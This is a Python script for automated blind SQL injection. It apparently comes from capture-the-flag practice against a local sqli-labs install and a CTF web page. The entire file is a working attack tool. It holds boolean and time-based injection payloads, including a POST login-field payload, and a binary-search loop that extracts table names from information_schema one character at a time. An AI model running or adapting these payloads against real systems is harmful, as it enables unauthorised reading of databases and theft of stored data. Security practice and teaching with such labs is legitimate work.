#! /usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2018/6/28 下午 09:43
# @Site    : 
# @File    : sql.py
# @Software: PyCharm
# @Author: Xuchao


import requests
import time
import sys


def getPayload(indexOfResult, indexOfChar, mid):  #payload构造函数

    column_name = "schema_name"
    table_name = "schemata"
    schema_name = "information_schema"

    startStr = "1\" and "
    endStr = " and \"1\"=\"1"

    # payload = "((ascii(substring((select " + column_name + " from " + database_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"

    #payload = "((ascii(substring((select " + column_name + " from " + schema_name + "." + table_name + "  limit " + indexOfResult + ",1)," + indexOfChar + ",1)))>" + mid + ")"

    #payload = "if(ascii(substr(database(),"+indexOfChar+",1))>"+mid+",sleep(5),1)"
    payload = "if(ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema='security'),"+indexOfChar+",1))>"+mid+",sleep(1),1)"
    payload = startStr + payload + endStr
    return payload

def getpayload_post(indexOfResult, indexOfChar, mid):
    post_data = {
        'uname':'admin" or if((ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=database()),'+indexOfChar+',1)))>'+mid+',sleep(1),1) or 1="1',
        'passwd':'admin',
        'submit':'Submit'
    }
    #print(post_data)
    return post_data

def time_post_exec(indexOfResult, indexOfChar, mid):  #post时间盲注
    url = "http://127.0.0.1/sqli-labs-master/Less-16/"
    start_time = time.time()
    requests.post(url,data=getpayload_post(indexOfResult,indexOfChar,mid))
    if(time.time() - start_time > 2):
        return True
    else:
        return False

def bool_post_exec(indexOfResult, indexOfChar, mid):  #post布尔盲注
    url = ''
    content = requests.post(url,data=getpayload_post(indexOfResult,indexOfChar,mid))
    if " " in content.text:
        return True
    else:
        return False

def bool_get_exce(indexOfResult, indexOfChar, mid):  #基于bool的payload执行函数
    # content-start
    url = "http://ctf5.shiyanbar.com/web/index_3.php?id="
    tempurl = url + getPayload(indexOfResult, indexOfChar, mid)
    content = requests.get(tempurl).text
    # content-end
    # judge-start
    if "Hello!" in content:  #页面标志字符串
        return True
    else:
        return False
        # judge-end

def time_get_exec(indexOfResult, indexOfChar, mid):  #基于时间的盲注的执行函数
    url = "http://127.0.0.1/sqli-labs-master/Less-10/?id=1"
    tempurl =url+ getPayload(indexOfResult,indexOfChar,mid)
    #print(tempurl)
    start_time = time.time()
    requests.get(tempurl)
    #print(time.time()-start_time)
    if(time.time()-start_time > 2):
        return True
    else:
        return False

def doubleSearch(indexOfResult, indexOfChar, left_number, right_number):
    while left_number < right_number:
        mid = int((left_number + right_number) / 2)
        if time_post_exec(str(indexOfResult), str(indexOfChar + 1), str(mid)):
            left_number = mid
        else:
            right_number = mid
        if left_number == right_number - 1:
            if time_post_exec(str(indexOfResult), str(indexOfChar + 1), str(mid)):
                mid += 1
                break
            else:
                break
    return chr(mid)


def search():
    for i in range(32):  # 需要遍历的结果的数量
        counter = 0
        for j in range(32):  # 每个结果的长度
            counter += 1
            temp = doubleSearch(i, j, 0, 127)  # 从255开始查询
            if ord(temp) == 1:  # 当为1的时候说明已经查询结束
                break
            sys.stdout.write(temp)
            sys.stdout.flush()
        if counter == 1:  # 当结果集的所有行都被遍历后退出
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()

if __name__ == '__main__':

    search()





